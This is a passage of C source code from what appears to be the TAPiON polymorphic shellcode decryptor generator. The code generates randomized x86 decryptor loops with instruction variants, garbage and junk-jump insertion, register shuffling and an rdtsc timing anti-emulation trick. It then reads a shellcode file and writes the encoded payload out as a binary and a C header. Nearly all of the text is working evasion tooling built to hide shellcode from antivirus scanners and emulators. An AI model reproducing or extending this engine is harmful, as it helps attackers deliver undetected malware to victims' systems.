			if (dst_reg != _MR_ESI)
			{
				variant = random_eax(BLOCK6_VAR_SIZE + 1);
				goto again_var;
			}

			if (src_reg != _MR_EAX)
				loc += gen_instruction(loc, NULL, p_push_reg,NULL,_MR_EAX,NULL);

			loc += gen_instruction(loc, NULL, p_lodsd,NULL,NULL,NULL);
			loc += gen_block8(loc,_MR_ESI,TYPE_DEC,4);		// normalize

			if (src_reg != _MR_EAX)
			{
				loc += gen_block4(loc,src_reg,_MR_EAX);		// copy block
				loc += gen_instruction(loc, NULL, p_pop_reg,NULL,_MR_EAX,NULL);
			}


			total_size = (DWORD)(loc-loc2);
			break;

	}

	return total_size;

}


// ----------------------------------------------------------------------
// BLOCK 7:
// generates: xor [reg1+reg2],reg3
// ----------------------------------------------------------------------

int gen_block7(unsigned char *loc, BYTE src1_reg, BYTE src2_reg, BYTE dst_reg)
{
	#define BLOCK7_VAR_SIZE	4

	int variant;
	int total_size = 0;
	int li = 0;
	int m1;
	int was_pre = 0;
	unsigned char *loc2;

	loc2 = loc;


	// get a variant
	variant = random_eax(BLOCK7_VAR_SIZE + 1);

#if DEBUG_IT == 1
	variant = B7_VARIANT;
#endif

	if (hard_var == 1)
		variant = choosen_var;

	choosen_var = variant;

	if ((hard_var == 0) && (random_eax(3) == 1))
	{
		*(BYTE*)loc = P_LOCK;
		loc++;
		was_pre = 1;
	}


	switch (variant)
	{

		// variant 0:
		// xor [reg1(EIP-BLOCK3r) + reg3(BLOCK5r)],reg4(PASS-BLOCK6r)
		// this variant will be written by hand
		default:
		case 0:
			*(BYTE*)loc = 0x31;
			loc++;
			*(BYTE*)loc = (0x14 & 0xC7) | (dst_reg << 3);
			loc++;
			m1 = (0x8 & 0xC7) | (src1_reg << 3);
			m1 = (m1 & 0xF8) | (src2_reg);
			*(BYTE*)loc = m1;
			loc++;
			loc += place_garbage(loc);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 1:
		// push reg1(EIP_BLOCK3r)
		// add reg1,reg3(BLOCK5r)
		// xor [reg1],reg4
		// pop reg1(EIP_BLOCK3r)

		case 1:
			if (was_pre == 1)
				loc--;
			loc += gen_instruction(loc,NULL,p_push_reg,NULL,src1_reg,NULL);
			loc += gen_instruction(loc,NULL,p_add_reg_reg,NULL,src2_reg,src1_reg);

			if (was_pre == 1)
			{
				*(BYTE*)loc = P_LOCK;
				loc++;
			}

			loc += gen_instruction(loc,NULL,p_xor_dreg_reg,NULL,src1_reg,dst_reg);
			loc += gen_instruction(loc,NULL,p_pop_reg,NULL,src1_reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 2:
		// add reg1,reg3(BLOCK5r)
		// xor [reg1],reg4
		// sub reg1,reg3(BLOCK5r)
		case 2:
			if (was_pre == 1)
				loc--;

			loc += gen_instruction(loc,NULL,p_add_reg_reg,NULL,src2_reg,src1_reg);
			if (was_pre == 1)
			{
				*(BYTE*)loc = P_LOCK;
				loc++;
			}
			loc += gen_instruction(loc,NULL,p_xor_dreg_reg,NULL,src1_reg,dst_reg);
			loc += gen_instruction(loc,NULL,p_sub_reg_reg,NULL,src2_reg,src1_reg);
			total_size = (DWORD)(loc-loc2);
			break;

		// variant 3:
		// add reg3,reg1
		// xor [reg3],reg4
		// sub reg3,reg1
		case 3:
			if (was_pre == 1)
				loc--;

			loc += gen_instruction(loc,NULL,p_add_reg_reg,NULL,src1_reg,src2_reg);
			if (was_pre == 1)
			{
				*(BYTE*)loc = P_LOCK;
				loc++;
			}
			loc += gen_instruction(loc,NULL,p_xor_dreg_reg,NULL,src2_reg,dst_reg);
			loc += gen_instruction(loc,NULL,p_sub_reg_reg,NULL,src1_reg,src2_reg);
			total_size = (DWORD)(loc-loc2);
			break;


		// variant 4:
		// push reg3
		// add reg3,reg1
		// xor [reg3],reg4
		// pop reg3
		case 4:
			if (was_pre == 1)
				loc--;
			loc += gen_instruction(loc,NULL,p_push_reg,NULL,src2_reg,NULL);
			loc += gen_instruction(loc,NULL,p_add_reg_reg,NULL,src1_reg,src2_reg);

			if (was_pre == 1)
			{
				*(BYTE*)loc = P_LOCK;
				loc++;
			}

			loc += gen_instruction(loc,NULL,p_xor_dreg_reg,NULL,src2_reg,dst_reg);
			loc += gen_instruction(loc,NULL,p_pop_reg,NULL,src2_reg,NULL);
			total_size = (DWORD)(loc-loc2);
			break;




	}

	total_size += place_garbage(loc);
	return total_size;
}

// ----------------------------------------------------------------------
// BLOCK 8:
// generates: inc/dec reg
// type: TYPE_DEC = 0 / TYPE_INC = 1
// ----------------------------------------------------------------------

int gen_block8(unsigned char *loc, BYTE reg, int type,int ile)
{
	DWORD total_size;
	DWORD loc2 = (DWORD)loc;
	DWORD r1_value = random_without_zero();
	int li;
	int ile2;

	if ((type == TYPE_INC) && (random_eax(2) == 1))
		goto another_inc;

	if ((type == TYPE_DEC) && (random_eax(2) == 1))
		goto another_dec;

another_normal:
	for (li = 0; li != ile; li++)
	{
		if (type == TYPE_DEC)
			loc += gen_instruction(loc, NULL, p_dec_reg,NULL,reg,NULL);

		if (type == TYPE_INC)
			loc += gen_instruction(loc, NULL, p_inc_reg,NULL,reg,NULL);

	}
	total_size = (DWORD)(loc-loc2);
	return total_size;

another_inc:
	ile2 = random_eax(ile+1);
	loc += gen_instruction(loc, NULL, p_add_reg_num,(char*)&r1_value,reg,NULL);
	r1_value -= ile2;
	loc += gen_instruction(loc, NULL, p_sub_reg_num,(char*)&r1_value,reg,NULL);
	if (ile2 != ile)
	{
		ile -= ile2;
		goto another_normal;
	}

	total_size = (DWORD)(loc-loc2);
	return total_size;

another_dec:
	ile2 = random_eax(ile+1);
	loc += gen_instruction(loc, NULL, p_sub_reg_num,(char*)&r1_value,reg,NULL);
	r1_value -= ile2;
	loc += gen_instruction(loc, NULL, p_add_reg_num,(char*)&r1_value,reg,NULL);
	if (ile2 != ile)
	{
		ile -= ile2;
		goto another_normal;
	}

	total_size = (DWORD)(loc-loc2);
	return total_size;






}

// ----------------------------------------------------------------------
// BLOCK 9:
// generates:
//				cmp byte ptr [pass_ptr_reg],magic
//				jne OVER_IT
//				call gen_block6 (reset the register)
//	 OVER_IT:
// ----------------------------------------------------------------------


int gen_block9(unsigned char *loc, BYTE pass_ptr_reg, BYTE src_reg, BYTE dst_reg, BYTE magic, int stepx_inc)
{

	DWORD total_size, temp_size = 0;
	DWORD loc2 = (DWORD)loc;
	DWORD temp2;
	int old_flag;

	char magic_b;
	unsigned char *temp[50];
	unsigned char *t_ptr;
	
	magic_b = magic;
	temp2 = (DWORD)temp;

	// when step_inc is equal to zero, we can not use this block

	if ((random_eax(3) == 1) && (stepx_inc == 0))
		goto not_use_it;


	
	magic_store = 1;

	t_ptr = (unsigned char*)&temp;

	loc += gen_instruction(loc, NULL, p_cmp_breg_val, (char*)&magic_b, pass_ptr_reg, NULL);	
	
	temp_size += place_garbage(t_ptr);
	t_ptr += temp_size;
	temp_size += gen_block4((unsigned char*)t_ptr,src_reg,dst_reg);

	// ----------------------------------------------------------------------
	// fixed:
	// !!! BUG !!! no garbage after directly after jne it causes wrong jump
	// calculation
	// ----------------------------------------------------------------------

	old_flag = garbage_flag;
	garbage_flag = G_NO;
	loc += gen_instruction(loc, NULL, p_jne, (char*)&temp_size, NULL, NULL);
	garbage_flag = old_flag;
	memcpy((void*)loc, (void*)&temp, temp_size);
	loc += temp_size;
	loc += place_garbage(loc);
	total_size = (DWORD)(loc-loc2);
	return total_size;


not_use_it:
	return 0;


}


// ----------------------------------------------------------------------
// BLOCK 10:
// generates:
// test reg,reg
// jnz jmp_dst
// ----------------------------------------------------------------------

int gen_block10(unsigned char *loc, BYTE reg, DWORD jmp_dst, int neg)
{
	#define BLOCK10_VAR_SIZE	2

	int variant;
	int total_size = 0;
	int li = 0;
	unsigned char *loc2;
	DWORD magic_b;

	loc2 = loc;

	// get a variant
	variant = random_eax(BLOCK10_VAR_SIZE + 1);
	magic_b = jmp_dst;

	if (neg == 1)
		magic_b = magic_b * (-1);


#if DEBUG_IT == 1
	variant = B10_VARIANT;
#endif

	if (hard_var == 1)
		variant = choosen_var;

	choosen_var = variant;


	
	garbage_flag = G_COPRO;
		
	switch (variant)
	{

		// variant 0:
		// test eax,eax
		// jnz jmp_dst
		case 0:
			loc += gen_instruction(loc, NULL, p_test_reg_reg,NULL,reg,reg);
			magic_b += ((DWORD)(loc2-loc)) - 2;

			// yeah man short and long jumps
			if (((signed)magic_b < 0x7F) && ((signed)magic_b > 0xFFFFFF81))
			{
				loc += gen_instruction(loc, NULL, p_jg, (char*)&magic_b, NULL, NULL);
			}
			else
			{
				magic_b -= 4;
				*(BYTE*)loc = 0x0F;
				loc++;
				loc += gen_instruction(loc, NULL, p_jg_long, (char*)&magic_b, NULL, NULL);
				printf("[+] Using long jump!\n");
			}

			total_size = (DWORD)(loc-loc2);
			break;

		// variant 1:
		// and eax,eax
		// jnz jmp_dst
		case 1:
			loc += gen_instruction(loc, NULL, p_and_reg_reg,NULL,reg,reg);
			magic_b += (char)((DWORD)(loc2-loc)) - 2;

			// yeah man short and long jumps
			if (((signed)magic_b < 0x7F) && ((signed)magic_b > 0xFFFFFF81))
			{
				loc += gen_instruction(loc, NULL, p_jg, (char*)&magic_b, NULL, NULL);
			}
			else
			{
				magic_b -= 4;
				*(BYTE*)loc = 0x0F;
				loc++;
				loc += gen_instruction(loc, NULL, p_jg_long, (char*)&magic_b, NULL, NULL);
				printf("[+] Using long jump!\n");
			}

			total_size = (DWORD)(loc-loc2);
			break;

		// variant 2:
		// or eax,eax
		// jnz jmp_dst
		default:
		case 2:
			loc += gen_instruction(loc, NULL, p_or_reg_reg,NULL,reg,reg);
			magic_b += (char)((DWORD)(loc2-loc)) - 2;

			// yeah man short and long jumps
			if (((signed)magic_b < 0x7F) && ((signed)magic_b > 0xFFFFFF81))
			{
				loc += gen_instruction(loc, NULL, p_jg, (char*)&magic_b, NULL, NULL);
			}
			else
			{
				magic_b -= 4;
				*(BYTE*)loc = 0x0F;
				loc++;
				loc += gen_instruction(loc, NULL, p_jg_long, (char*)&magic_b, NULL, NULL);
				printf("[+] Using long jump!\n");
			}

			total_size = (DWORD)(loc-loc2);
			break;

	}

	return total_size;

}


int place_anti_emul(unsigned char *loc, BYTE reg, BYTE reg_over)
{
	int total_size = 0;
	int rv = random_eax(2);
	DWORD loc2 = (DWORD)loc;

	// push eax edx or edx eax
	if (rv == 0)
	{
		loc += gen_instruction(loc, NULL, p_push_reg,NULL,_MR_EAX,NULL);
		loc += gen_instruction(loc, NULL, p_push_reg,NULL,_MR_EDX,NULL);
	}
	else
	{
		loc += gen_instruction(loc, NULL, p_push_reg,NULL,_MR_EDX,NULL);
		loc += gen_instruction(loc, NULL, p_push_reg,NULL,_MR_EAX,NULL);
	}

	*(WORD*)loc = 0x310F;			// rdtsc
	loc += 2;

	loc += gen_block4(loc, reg_over, _MR_EAX);

	*(WORD*)loc = 0x310F;			// rdtsc
	loc += 2;

	loc += gen_instruction(loc, NULL, p_sub_reg_reg,NULL,reg_over,_MR_EAX);
	loc += gen_instruction(loc, P_16b, p_xor_reg_reg,NULL,_MR_EAX,_MR_EAX);
	loc += gen_instruction(loc, NULL, p_add_reg_reg,NULL,_MR_EAX,reg);

	

	if (rv == 0)
	{
		loc += gen_instruction(loc, NULL, p_pop_reg,NULL,_MR_EDX,NULL);
		loc += gen_instruction(loc, NULL, p_pop_reg,NULL,_MR_EAX,NULL);
	}
	else
	{
		loc += gen_instruction(loc, NULL, p_pop_reg,NULL,_MR_EAX,NULL);
		loc += gen_instruction(loc, NULL, p_pop_reg,NULL,_MR_EDX,NULL);
	}

	total_size = (DWORD)(loc-loc2);
	return total_size;

}

int place_garbage(unsigned char *loc)
{
	int old_flag;
	int total_size = 0;
	int ile_gar = random_eax(MAX_GARBAGE + 1);
	int rv;
	int is;
	int sreg, dreg, rop;
	int ret_it;
	DWORD j_b;
	DWORD loc2 = (DWORD)loc;


	garbage_size = 0;
	ret_it = 0;


	if (garbage_global_flag == -1)
		goto end_gar;

	if (garbage_global_flag > 0)
		ile_gar = garbage_global_flag;

	if ((random_eax(3) == 1) && (ile_gar > 0) && (garbage_flag == G_BOTH) && (do_jumps == 1))
		goto gen_gar_jumps;


give_gar:
	if ((garbage_flag != G_NO) && (ile_gar > 0))
	{
		for (int li = 0; li != ile_gar; li++)
		{
			rv = random_eax(2);

			// give some copro?
			if ((rv == 0) && (garbage_flag == G_COPRO || garbage_flag == G_BOTH))
			{
				// initialize the copro
				if (copro_init != 1)
				{
					copro_init = 1;
					memcpy((void*)loc,&i_copro_init,sizeof(i_copro_init));
					loc += sizeof(i_copro_init);
				}

				is = (2 * (random_eax((sizeof(i_copro)/2))));
				memcpy((void*)loc, &i_copro[is], 2);
				loc += 2;

			}

			if ((rv != 0) && (garbage_flag == G_BOTH))
			{
				sreg = mut_regs_var[random_eax(POSSIBLE_REGS_SIZE + 1)];
				dreg = mut_regs_var[random_eax(POSSIBLE_REGS_SIZE + 1)];
				rop = random_without_zero();

				is = random_eax(sizeof(i_gar_normal));

				if (is < 4) sreg = dreg;

				old_flag = garbage_flag;
				garbage_flag = G_NO;
				loc += gen_instruction(loc, NULL, i_gar_normal[is], (char*)&rop, sreg, dreg);
				garbage_flag = old_flag;
			}

		}


	}

	if (ret_it == 1)
		goto back_jmps;

	if (ret_it == 2)
		goto end_gar;


end_gar:
	total_size = (DWORD)(loc-loc2);
	garbage_size = total_size;
	return total_size;

gen_gar_jumps:
	is = random_eax(sizeof(i_gar_jmp));
	*(BYTE*)loc = i_gar_jmp[is];
	loc++;
	j_b = (DWORD)loc;
	loc++;
	ret_it = 1;
	goto give_gar;

back_jmps:
	*(BYTE*)j_b = (DWORD)(loc-j_b) - 1;
	ile_gar = random_eax(3);
	if (ile_gar == 0) goto end_gar;
	ret_it = 2;
	goto give_gar;
	






}


// Generates the main loop of the decryptor:

int gen_decryptor_loop(unsigned char *pp_loop, int step_inc, int step_dec)
{

#define GEN_D_VARS	3

	int r_rand;
	int total_size;

	DWORD loop_size;
	DWORD where_loop;
	DWORD pp_loop2;

	pp_loop2 = (DWORD)pp_loop;


	r_rand = random_eax(GEN_D_VARS);

	where_loop = (DWORD)pp_loop;
	pp_loop += gen_mov_reg_dreg((unsigned char*)pp_loop,mut_regs_var[BLOCK6r],mut_regs_var[BLOCK4r]);


	switch (r_rand)
	{
		// Variant 0:
		// xor block
		// dec reg BLOCK5r (backwards)
		// inc reg BLOCK4r (with pass)
		// dec reg BLOCK2r (shell size)
		// cmp magic
		case 0:
			przed_magic = 1;
			f_decr = 0;
			pp_loop += gen_crypto((unsigned char*)pp_loop,mut_regs_var[BLOCK3r],mut_regs_var[BLOCK5r],mut_regs_var[BLOCK6r]);
			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK5r],TYPE_DEC,step_dec);
			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK4r],TYPE_INC,step_inc);
			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK2r],TYPE_DEC,step_dec); // shellcode size
	
			//fix_magic = (DWORD)pp_loop;
			garbage_flag = G_COPRO;
			pp_loop += gen_cmp_breg_magic((unsigned char*)pp_loop,mut_regs_var[BLOCK4r],mut_regs_var[BLOCK4r],mut_regs_var[BLOCK3r],0x00,step_inc);
			garbage_flag = G_BOTH;
			break;

		// Variant 1:
		// inc reg BLOCK4r (with pass)
		// xor block
		// cmp magic
		// dec reg BLOCK5r (backwards)
		// dec reg BLOCK2r (shell size)
		case 1:
			przed_magic = 1;
			f_decr = 0;
			f3_decr = 1;
			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK4r],TYPE_INC,step_inc);
			pp_loop += gen_crypto((unsigned char*)pp_loop,mut_regs_var[BLOCK3r],mut_regs_var[BLOCK5r],mut_regs_var[BLOCK6r]);

			//fix_magic = (DWORD)pp_loop;
			garbage_flag = G_COPRO;
			pp_loop += gen_cmp_breg_magic((unsigned char*)pp_loop,mut_regs_var[BLOCK4r],mut_regs_var[BLOCK4r],mut_regs_var[BLOCK3r],0x00,step_inc);
			garbage_flag = G_BOTH;			
			
			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK5r],TYPE_DEC,step_dec);
			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK2r],TYPE_DEC,step_dec); // shellcode size
			break;


		// Variant 2:
		// cmp magic
		// dec reg BLOCK5r (backwards)
		// xor block
		// dec reg BLOCK2r (shell size)
		// inc reg BLOCK4r (with pass)

		case 2:
			//fix_magic = (DWORD)pp_loop;
			f_decr = 1;
			przed_magic = 0;
			garbage_flag = G_COPRO;
			pp_loop += gen_cmp_breg_magic((unsigned char*)pp_loop,mut_regs_var[BLOCK4r],mut_regs_var[BLOCK4r],mut_regs_var[BLOCK3r],0x00,step_inc);
			garbage_flag = G_BOTH;	

			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK5r],TYPE_DEC,step_dec);
			pp_loop += gen_crypto((unsigned char*)pp_loop,mut_regs_var[BLOCK3r],mut_regs_var[BLOCK5r],mut_regs_var[BLOCK6r]);
			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK2r],TYPE_DEC,step_dec);
			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK4r],TYPE_INC,step_inc);
			break;


		// Variant 3:
		// 3:
		// dec reg BLOCK5r (backwards)
		// inc reg BLOCK4r (with pass)
		// cmp magic
		// dec reg BLOCK2r (shell size)
		// xor block
		default:
		case 3:
			przed_magic = 1;
			f_decr = 1;
			f3_decr = 1;
			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK5r],TYPE_DEC,step_dec);
			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK4r],TYPE_INC,step_inc);

			//fix_magic = (DWORD)pp_loop;
			garbage_flag = G_COPRO;
			pp_loop += gen_cmp_breg_magic((unsigned char*)pp_loop,mut_regs_var[BLOCK4r],mut_regs_var[BLOCK4r],mut_regs_var[BLOCK3r],0x00,step_inc);
			garbage_flag = G_BOTH;	

			pp_loop += gen_inc_dec_reg((unsigned char*)pp_loop,mut_regs_var[BLOCK2r],TYPE_DEC,step_dec);
			pp_loop += gen_crypto((unsigned char*)pp_loop,mut_regs_var[BLOCK3r],mut_regs_var[BLOCK5r],mut_regs_var[BLOCK6r]);
			break;


	}


	loop_size = ((DWORD)pp_loop - (DWORD)where_loop);
	

	//printf("Loop size: %x\n",(BYTE)(loop_size*(-1)));
	//printf("Loop size is: %x bytes\n",(DWORD)loop_size);


	
	pp_loop += gen_cmp_final((unsigned char*)pp_loop,mut_regs_var[BLOCK2r],loop_size,1);
	garbage_flag = G_BOTH;

	/*
	pp_loop += place_garbage(pp_loop);
	pp_loop += place_garbage(pp_loop);
	pp_loop += place_garbage(pp_loop);
	pp_loop += place_garbage(pp_loop);
	*/
	

	total_size = (DWORD)(pp_loop - pp_loop2);
	return total_size;

}

int read_shell_from_file(unsigned char *where)
{

	int sf = open(filename, O_RDONLY|O_BINARY);
	int size;

	printf("[+] Trying to open %s\n",filename);

	if (sf == -1)
	{
		printf("[-] Error: cannot open shellcode file\n");
		goto r_err;
	}


	size = filelength(sf);

	if (size >= MAX_SHELL_SIZE)
	{
		printf("[-] Error: shellcode size is larger then %d bytes\n",MAX_SHELL_SIZE);
		printf("[-] Error: this version doesn't support larger files!\n");
		goto r_err;
	}

	read(sf, (void*)where, size);
	close(sf);

	printf("[+] Readen %d bytes\n",size);
	return size;


r_err:
	exit(0);

}


int dump_shell_to_file(unsigned char *where, int size)
{
	FILE *sf,*sf_h;

	int i, i2;
	char t_name[MAX_PATH];
	char t2_name[MAX_PATH];
	char temp_buff[10];

	#define H_BLOCK_SIZE 10

	char s_pro_s[]="unsigned char tapion_shell[] = {\n ";
	char s_pro_e[]="\n};\n";

	_snprintf(t_name,sizeof(t_name),"%s.tapion_bin",filename);
	_snprintf(t2_name,sizeof(t_name),"%s.tapion_bin.h",filename);


	DeleteFile(t_name);
	DeleteFile(t2_name);

	sf = fopen(t_name,"wb+");
	
	if (sf == NULL)
	{
		printf("[-] Error: cannot create output file\n");
		goto r_err;
	}

	
	fwrite((void*)where,1,size,sf);
	fclose(sf);


	printf("[+] Shellcode dumped to %s\n",t_name);
	printf("[+] Written %d bytes\n",size);


	sf_h = fopen(t2_name, "wb+");

		
	if (sf_h == NULL)
	{
		printf("[-] Error: cannot create output file\n");
		goto r_err;
	}



	fputs("// created with TAPiON Polymorphic Decryptor Generator\n",sf_h);
	fputs("// http://pb.specialised.info\n\n",sf_h);
	fprintf(sf_h,"// data size = %d bytes\n",size);
	

	fputs(s_pro_s,sf_h);

	i2 = 0;
	for (i=0; i!=size; i++)
	{

		if (i2 > H_BLOCK_SIZE)
		{
			i2 = 0;
			_snprintf(temp_buff,sizeof(temp_buff)," \n ");
			fputs(temp_buff,sf_h);
		}

			

		_snprintf(temp_buff,sizeof(temp_buff),"0x%.02x, ",*(BYTE*)(where+i));
		fputs(temp_buff,sf_h);

		i2++;
	}





	fseek(sf_h,-2,SEEK_CUR);
	fputs(s_pro_e,sf_h);

	printf("[+] Shellcode header stored to %s\n",t2_name);

	fclose(sf_h);
	

	return size;


r_err:
	exit(0);

}

void mutate_regs(void)
{
	int ktory = 1;
	int r_rand = random_eax(POSSIBLE_REGS_SIZE+1);
	int reg = 0;

	mut_regs_var[0] = possible_regs[r_rand];
	possible_regs[r_rand] = 'Y';

	while (ktory != POSSIBLE_REGS_SIZE)
	{
rand_again:
		Sleep(10);
		r_rand = random_eax(POSSIBLE_REGS_SIZE+1);
		if (possible_regs[r_rand] == 'Y')
			goto rand_again;

		mut_regs_var[ktory] = possible_regs[r_rand];
		possible_regs[r_rand] = 'Y';

		ktory++;
	}

}